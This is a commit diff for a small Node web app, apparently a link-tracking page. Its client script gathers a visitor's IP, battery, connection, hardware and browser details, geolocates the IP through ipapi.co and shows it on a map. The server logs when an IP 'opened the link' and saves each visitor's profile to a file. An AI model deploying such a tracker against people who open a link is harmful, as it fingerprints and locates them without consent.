284f4d8c4253f5deb89f511c141248e0c6f4572a
DevadutSB <56481296+DevadutSB@users.noreply.github.com>
2023-02-17 18:26:27 +0530

    map

--- public/js/speed.js
+++ public/js/speed.js
@@ -5,6 +5,34 @@ function hide(){
 getIP=(json)=>{ip=json.ip}
 let options='';
 
+JSA ={}
+
+function map(){
+
+    var element = document.getElementById('map');
+    element.style = 'height:300px;';
+    var map = L.map(element);
+    L.tileLayer('http://{s}.tile.osm.org/{z}/{x}/{y}.png', {
+        attribution: '&copy; <a href="http://osm.org/copyright">OpenStreetMap</a> contributors'
+    }).addTo(map);
+
+    var target = L.latLng(JSA["latitude"], JSA['longitude']);
+
+    map.setView(target, 14);
+
+    L.marker(target).addTo(map);
+}
+
+async function getLocation (ip) {
+    let url = `https://ipapi.co/${ip}/json/`;
+  
+    await fetch(url).then((response) =>
+      response.json().then((json) => {
+        JSA = json
+      })
+    );
+  };
+  
 async function con(){
     let p=window.navigator.getBattery().then(async(bat)=>{
         let battery;
@@ -20,12 +48,14 @@ async function con(){
         let device={cpu:navigator.hardwareConcurrency,ram:window.navigator.deviceMemory ?  window.navigator.deviceMemory : 'Browser is too Secure ' ,os:navigator.platform}
         const data = {battery,client,con,device,ip};
         let browser = data.client.browser  
-        console.log(data)
-        let user = '_____________'+data.ip+'_________________\n\n'
+        await getLocation(ip)
+        let user = '_____________Hello User with IP Adress '+ip+" From "+JSA.city+'_________________\n\n'
         let batt = `The battery is at ${data.battery.level} and battery is ${data.battery.charging}\n`
         let conn = `The user took ${(data.con.rtt*25)/1000} seconds to send and recieve on avrage\nThe user Internet speed is extimated to be ${data.con.speed} and downlink is ${data.con.downlink}\n`
         let dev = `The user is using ${data.device.os} with ${data.device.ram} GB RAM and ${data.device.cpu} logical processers`
-        let brow   =`\nThe user is browsing in ${browser} with ${data.client.vender} as vendor`
+        let brow =`\nThe user is browsing in ${browser} with ${data.client.vender} as vendor`
+        data.ip = JSA
+        map()
         let final=user+batt+conn+dev+brow
         document.getElementById('data').innerHTML=final.replaceAll('\n','<br>')
         options = {
--- server.js
+++ server.js
@@ -16,16 +16,14 @@ app.post('/data',async (req,res)=>{
     let data = req.body
     console.log(`IP:${data.ip} opened the link\n\nSaving to database\n\n`)
     let browser = data.client.browser
-    let user = `${time}\n_____________${data.ip}_________________\n\n`
-    let bat = `The battery is at ${data.battery.level} and battery is ${data.battery.charging}\n`
-    let con = `The user took ${(data.con.rtt*25)/1000} seconds to send and recieve on avrage\nThe user Internet speed is extimated to be ${data.con.speed} and downlink is ${data.con.downlink}\n`
-    let device = `The user is using ${data.device.os} with ${data.device.ram} GB RAM and ${data.device.cpu} logical processers`
-    let brow   =`\nThe user is browsing in ${browser} with ${data.client.vender} as vendor`
-    let ip     ='\n'+data.ip+data.client.ip_info
-    let final=user+bat+con+device+brow+ip
-    console.log(final)
-    await write(`./database/${data.ip}.txt`,final)
-    await write(`./database/${data.ip}.json`,JSON.stringify(data))
+    console.log(`
+    ${time}\n_____________${data.ip}_________________\n\n
+    The battery is at ${data.battery.level} and battery is ${data.battery.charging}\n
+    The user took ${(data.con.rtt*25)/1000} seconds to send and recieve on avrage\nThe user Internet speed is extimated to be ${data.con.speed} and downlink is ${data.con.downlink}\n
+    The user is using ${data.device.os} with ${data.device.ram} GB RAM and ${data.device.cpu} logical processers
+    The user is browsing in ${browser} with ${data.client.vender} as vendor
+    `)
+    await write(`./database/${data.ip.ip}.json`,JSON.stringify(data))
     console.log('\n\nFile Written')
     if(!data){
         res.status('404').json({msg:'no data'})
